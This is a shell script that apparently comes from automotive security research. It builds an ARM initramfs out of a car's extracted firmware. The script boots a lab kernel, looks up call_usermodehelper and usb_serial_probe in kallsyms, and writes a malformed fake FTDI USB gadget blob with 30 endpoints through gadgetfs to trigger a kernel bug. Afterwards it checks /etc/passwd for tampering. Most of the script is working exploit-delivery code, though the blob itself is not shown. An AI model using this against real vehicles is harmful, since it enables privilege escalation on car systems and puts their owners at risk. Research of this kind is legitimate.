#!/bin/sh
# Minimal ARM initramfs from the car's own busybox+libc (eglibc 2.18).
# Boots the lab kernel, dumps probe-relevant symbols, then writes the fake
# FTDI gadgetfs blob (30 bulk-IN endpoints) to trigger usb_serial_probe.
REPO=$(cd "$(dirname "$0")/.." && pwd)
P=$REPO/work/emmc
R=$REPO/lab/tmp/initramfs
rm -rf "$R" && mkdir -p "$R"/{bin,sbin,proc,sys,dev,tmp,lib}
for a in sh cat mount umount gunzip zcat poweroff halt reboot ls sleep grep head tail dmesg echo mkdir sed ifconfig; do
  ln -sf busybox "$R/bin/$a"
done
mkdir -p "$R/etc"
# the car's active /etc/passwd = symlink to the closed variant (extraction
# flattens symlinks, so mimic runtime content as a plain file)
cp "$P/etc/passwd-user-access-rights-inactive-closed" "$R/etc/passwd"
cp "$P/bin/busybox" "$R/bin/busybox"
cp "$P/lib/ld-linux-armhf.so.3" "$P/lib/libc.so.6" "$P/lib/libm.so.6" "$R/lib/"
BLOB=${BLOB:-$REPO/lab/tmp/ftdi_blob}
cp "$BLOB" "$R/ftdi_blob"
cat > "$R/init" <<'EOF'
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
# devtmpfs, like the car (CONFIG_DEVTMPFS_MOUNT=y there): gives /dev/ptmx
# for telnetd ptys and every other node; shadows the two mknod'ed ones.
mount -t devtmpfs devtmpfs /dev
echo "===LAB-BOOT-OK==="
mkdir -p /dev/gadget
mount -t gadgetfs gadgetfs /dev/gadget || echo "gadgetfs mount FAILED"
ls -l /dev/gadget
C=$(ls /dev/gadget | head -n 1)
echo "===ATTACK chip=$C n_eps=30==="
grep -E 'call_usermodehelper$|usb_serial_probe$' /proc/kallsyms
cat /ftdi_blob > /dev/gadget/$C 2>/dev/null && echo "===BLOB-CLOSED-FD-CONTROL==="
# keep ep0 open: closing the file unbinds the gadget driver (dev_release)
exec 3>/dev/gadget/$C || echo "exec3 fail"
cat /ftdi_blob >&3 && echo "===BLOB-WRITTEN-FD3==="
sleep 10
echo "===PASSWD-AFTER==="
cat /etc/passwd
echo "===DMESG-TAIL==="
dmesg | tail -100
echo "===DONE==="
poweroff -f
EOF
chmod +x "$R/init"
mknod -m 666 "$R/dev/null" c 1 3 2>/dev/null
mknod -m 622 "$R/dev/console" c 5 1 2>/dev/null
(cd "$R" && find . | cpio -oH newc 2>/dev/null | gzip -9) > "$REPO/lab/tmp/initrd.gz"
ls -la "$REPO/lab/tmp/initrd.gz"
